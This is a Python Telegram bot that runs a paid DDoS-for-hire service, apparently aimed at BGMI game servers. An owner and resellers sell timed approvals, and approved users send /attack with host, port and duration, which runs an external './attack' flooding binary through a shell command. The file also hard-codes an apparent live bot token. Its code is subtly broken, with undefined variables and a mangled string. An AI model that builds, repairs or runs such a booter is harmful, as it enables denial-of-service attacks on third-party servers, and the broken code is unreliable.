import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import subprocess
import os
import time

# Replace with your bot token and owner ID
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
YOUR_OWNER_ID = 5628960731  # Replace with your actual owner ID
bot = telebot.TeleBot('7406690560:AAGHc1HW58ixy-dmTt6scPnRmhxSIcHWbqk')

# Paths to data files
USERS_FILE = 'users.txt'
BALANCE_FILE = 'balance.txt'
ATTACK_LOGS_FILE = 'log.txt'

# Database simulation
admins = set()  # Set to store admin user IDs
authorized_users = {}  # Dictionary to store authorized user info and expiry
user_balances = {}  # Dictionary to store admin balances

# Cooldown dictionary
bgmi_cooldown = {}

# Load data from files
def load_data():
    global authorized_users, user_balances
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            for line in f:
                try:
                    username, user_id, expiry_date = line.strip().split(', ')
                    authorized_users[int(user_id)] = {'username': username, 'expiry': datetime.fromisoformat(expiry_date)}
                except ValueError:
                    print(f"Skipping malformed line in {USERS_FILE}: {line}")
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r') as f:
            for line in f:
                try:
                    username, user_id, balance = line.strip().split(', ')
                    user_balances[int(user_id)] = {'username': username, 'balance': int(balance)}
                except ValueError:
                    print(f"Skipping malformed line in {BALANCE_FILE}: {line}")

# Save data to files
def save_users():
    with open(USERS_FILE, 'w') as f:
        for user_id, info in authorized_users.items():
            f.write(f"{info['username']}, {user_id}, {info['expiry'].isoformat()}\n")

def save_balances():
    with open(BALANCE_FILE, 'w') as f:
        for user_id, info in user_balances.items():
            f.write(f"{info['username']}, {user_id}, {info['balance']}\n")

# Load initial data
load_data()

# Menu keyboard
menu_markup = InlineKeyboardMarkup()
menu_markup.add(InlineKeyboardButton("🚀 Attack", callback_data="attack"))
menu_markup.add(InlineKeyboardButton("ℹ️ My Info", callback_data="my_info"))

def is_admin(user_id):
    return user_id in admins

def is_authorized(user_id):
    if user_id in authorized_users:
        expiry = authorized_users[user_id]['expiry']
        return datetime.now() < expiry
    return False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the Bot! Please choose an option:", reply_markup=menu_markup)

@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    if message.from_user.id == YOUR_OWNER_ID:
        try:
            new_admin_id = int(message.text.split()[1])
            initial_balance = int(message.text.split()[2])
            admins.add(new_admin_id)
            user_balances[new_admin_id] = {'username': '', 'balance': initial_balance}
            bot.reply_to(message, f"User {new_admin_id} added as admin with an initial balance of {initial_balance}.")
        except:
            bot.reply_to(message, "Please provide a valid user ID and initial balance.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if message.from_user.id == YOUR_OWNER_ID:
        try:
            admin_id = int(message.text.split()[1])
            admins.discard(admin_id)
            bot.reply_to(message, f"User {admin_id} removed from admin.")
        except:
            bot.reply_to(message, "Please provide a valid user ID.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")


@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    if message.from_user.id == YOUR_OWNER_ID:
        try:
            admin_id = int(message.text.split()[1])
            amount = int(message.text.split()[2])
            user_balances[admin_id] = user_balances.get(admin_id, {'username': '', 'balance': 0})
            user_balances[admin_id]['balance'] += amount
            save_balances()
            bot.reply_to(message, f"Added {amount} points to admin {admin_id}. New balance: {user_balances[admin_id]['balance']}.")
        except:
            bot.reply_to(message, "Please provide valid admin ID and amount.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = message.from_user.id
    if is_admin(user_id):
        balance = user_balances.get(user_id, {'balance': 0})['balance']
        bot.reply_to(message, f"Your current balance is: {balance}")
    elif user_id == YOUR_OWNER_ID:
        bot.reply_to(message, "Your current balance is: ∞")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = message.from_user.id
    if is_admin(user_id) or user_id == YOUR_OWNER_ID:
        try:
            target_id = int(message.text.split()[1])
            duration = message.text.split()[2]
            if duration.endswith("d"):
                days = int(duration[:-1])
                expiry = datetime.now() + timedelta(days=days)
                cost = 150 * days // 7
            elif duration.endswith("m"):
                months = int(duration[:-1])
                expiry = datetime.now() + timedelta(days=30 * months)
                cost = 1500 * months
            else:
                raise ValueError("Invalid duration format")
            if is_admin(user_id):
                if user_balances.get(user_id, {'balance': 0})['balance'] >= cost:
                    user_balances[user_id]['balance'] -= cost
                else:
                    bot.reply_to(message, "Insufficient balance.")
                    return
            authorized_users[target_id] = {
                'username': message.chat.username,
                'expiry': expiry
            }
            save_users()
            save_balances()
            bot.reply_to(message, f"User {target_id} approved for {duration}.")
        except:
            bot.reply_to(message, "Please provide valid user ID and duration (e.g., 1d, 1m).")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['removeapproval'])
def remove_approval(message):
    if is_admin(message.from_user.id) or message.from_user.id == YOUR_OWNER_ID:
        try:
            user_id = int(message.text.split()[1])
            if user_id in authorized_users:
                del authorized_users[user_id]
                save_users()
                bot.reply_to(message, f"Approval for user {user_id} removed.")
            else:
                bot.reply_to(message, "User not found.")
        except:
            bot.reply_to(message, "Please provide a valid user ID.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if is_admin(message.from_user.id) or message.from_user.id == YOUR_OWNER_ID:
        msg = bot.reply_to(message, "Please send the message to broadcast to all authorized users.")
        bot.register_next_step_handler(msg, send_broadcast_message)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

def send_broadcast_message(message):
    if is_admin(message.from_user.id) or message.from_user.id == YOUR_OWNER_ID:

broadcast_message = message.text
        for user_id in authorized_users:
            try:
                bot.send_message(user_id, broadcast_message)
            except:
                print(f"Failed to send message to user {user_id}")
        bot.reply_to(message, "Broadcast message sent to all authorized users.")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Function to log command
def log_command(user_id, target, port, time):
    with open(ATTACK_LOGS_FILE, 'a') as f:
        f.write(f"{datetime.now().isoformat()} - User {user_id} initiated an attack on {target}:{port} for {time} seconds.\n")

# Function to record command logs
def record_command_logs(user_id, command, target, port, time):
    # This function can be used to store logs in a database or other logging service if needed
    pass


# Function to reply when attack finishes
def attack_finished_reply(message, target, port, time):
    reply_message = (f"🚀 Attack finished Successfully!
n\n"
                     f"🗿Target: {target}:{port}\n"
                     f"🕦Attack Duration: {time}\n"
                     f"🔥Status: Attack is finished 🔥")
    bot.reply_to(message, reply_message)

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = message.from_user.id
    if is_authorized(user_id):
        if user_id not in admins and user_id != YOUR_OWNER_ID:
            if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
                remaining_time = 3 - (datetime.now() - bgmi_cooldown[user_id]).seconds
                response = f"You must wait {remaining_time:.2f} seconds before initiating another attack."
                bot.reply_to(message, response)
                return
            bgmi_cooldown[user_id] = datetime.now()

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time_duration = int(command[3])
            if time_duration > 300:
                response = "Error: Time interval must be less than 300."
                bot.reply_to(message, response)
            else:
                record_command_logs(user_id, '/attack', target, port, time_duration)
                log_command(user_id, target, port, time_duration)
                msg = start_attack_reply(message, target, port, time_duration)
                full_command = f"./attack {target} {port} {time_duration} 200"

            # Update message dynamically with increasing dots
            for i in range(int(attack_time)):
                time.sleep(1)
                dots = '.' * ((i % 5) + 1)  # Limit dots to maximum of 5
                update_message = (f"🚀 Attack started successfully! 🚀\n\n"
                                  f"🔹Target: {host}:{port}\n"
                                  f"⏱️Duration: {attack_time}\n"
                                  f"🔧Method: BGMI-VIP\n"
                                  f"🔥Status: Attack is started{dots}")
                bot.edit_message_text(update_message, chat_id=msg.chat.id, message_id=msg.message_id)
            
                # Run the attack command
                subprocess.run(full_command, shell=True)
                attack_finished_reply(message, target, port, time_duration)
        else:
            response = "To use the attack command, type it in the following format:\n\n /attack <host> <port> <time>"
            bot.reply_to(message, response)
    else:
        response = """🚫 Unauthorized Access! 🚫Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:

👉 Contact an Admin or the Owner for approval.
🌟 Become a proud supporter and purchase approval.
💬 Chat with an admin now and level up your capabilities!

🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"""
        bot.reply_to(message, response)

# Handler for "🚀 Attack" message
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def initiate_attack(message):
    user_id = message.from_user.id
    if is_authorized(user_id):
        response = "Please provide the details for the attack in the following format:\n\n<host> <port> <time>"
    else:
        response = """🚫 Unauthorized Access! 🚫

Oops! It seems like you don't have permission to initiate an attack. To gain access, you can:

👉 Contact an Admin or the Owner for approval.
🌟 Become a proud supporter and purchase approval.
💬 Chat with an admin now and level up your capabilities!

🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"""
    
    bot.reply_to(message, response)

# Start polling
bot.polling()